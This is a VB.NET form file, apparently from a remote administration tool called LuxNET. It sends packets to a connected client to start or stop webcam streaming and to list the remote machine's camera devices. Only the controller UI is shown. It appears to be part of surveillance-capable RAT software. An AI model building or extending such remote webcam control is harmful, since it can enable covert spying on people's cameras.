Imports LuxNET.My.Resources
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class RemoteWebcam
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.ausgefahren = False
        Me.recording = False
        Me.InitializeComponent()
    End Sub

    Private Sub btn_start_Click(sender As Object, e As EventArgs) Handles btn_start.Click
        If Not Me.recording Then
            Me.SendPacket(New Object() {CByte(&H79), "Start", Me.ComboBox1.SelectedIndex})
            Me.btn_start.BackgroundImage = My.Resources.monitor_off
            Me.recording = True
        Else
            Me.SendPacket(New Object() {CByte(&H79), "Stop", 1})
            Me.btn_start.BackgroundImage = My.Resources.monitor
            Me.recording = False
            Me.LabelFPS.Text = "FPS: 0"
            Me.PictureBox1.Image = Nothing
        End If
    End Sub

    Private Sub Panel1_Click(sender As Object, e As EventArgs) Handles Panel1.Click
        Dim point2 As Point
        If Not Me.ausgefahren Then
            Me.Panel2.Visible = True
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel1.Size.Width) / 2))))), &H2F)
            Me.Panel1.Location = point2
            Me.Panel1.BackgroundImage = My.Resources.arrow_090
            Me.ausgefahren = True
        Else
            Me.Panel1.BackgroundImage = My.Resources.arrow_270
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel1.Size.Width) / 2))))), 0)
            Me.Panel1.Location = point2
            Me.Panel2.Visible = False
            Me.ausgefahren = False
        End If
    End Sub

    Private Sub Panel1_MouseEnter(sender As Object, e As EventArgs) Handles Panel1.MouseEnter
        Me.Panel1.BackColor = Color.LightGray
    End Sub

    Private Sub Panel1_MouseLeave(sender As Object, e As EventArgs) Handles Panel1.MouseLeave
        Me.Panel1.BackColor = SystemColors.Control
    End Sub

    Private Sub Panel2_Paint(sender As Object, e As PaintEventArgs) Handles Panel2.Paint
        Dim path As New GraphicsPath
        path.AddRectangle(Me.Panel2.DisplayRectangle)
        e.Graphics.FillPath(New SolidBrush(Color.FromArgb(&H60, &H9F, &HD0)), path)
    End Sub

    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        If ((((e.Location.X >= 0) And (e.Location.X <= Me.Size.Width)) And (e.Location.Y >= 0)) And (e.Location.Y <= &H19)) Then
            Me.Panel1.Visible = True
        ElseIf Not Me.ausgefahren Then
            Me.Panel1.Visible = False
        End If
    End Sub

    Private Sub RemoteWebcam_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If Me.recording Then
            e.Cancel = True
        End If
    End Sub

    Private Sub RemoteWebcam_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.SendPacket(New Object() {CByte(&H7A)})
    End Sub

    Private Sub RemoteWebcam_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Dim point2 As Point
        If Me.ausgefahren Then
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel1.Size.Width) / 2))))), &H2F)
            Me.Panel1.Location = point2
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel2.Size.Width) / 2))))), 0)
            Me.Panel2.Location = point2
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Panel2.Size.Width) / 2) - (CDbl(Me.PanelItems.Size.Width) / 2))))), 3)
            Me.PanelItems.Location = point2
        Else
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel1.Size.Width) / 2))))), 0)
            Me.Panel1.Location = point2
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Size.Width) / 2) - (CDbl(Me.Panel2.Size.Width) / 2))))), 0)
            Me.Panel2.Location = point2
            point2 = New Point(CInt(Math.Round(CDbl(((CDbl(Me.Panel2.Size.Width) / 2) - (CDbl(Me.PanelItems.Size.Width) / 2))))), 3)
            Me.PanelItems.Location = point2
        End If
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
    End Sub

    Private ausgefahren As Boolean
    Public client As ServerClient
    Private packer As LuxNET.Pack
    Private recording As Boolean

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        GetWebcam = &H79
        GetWebcamDeviceNames = &H7A
    End Enum
End Class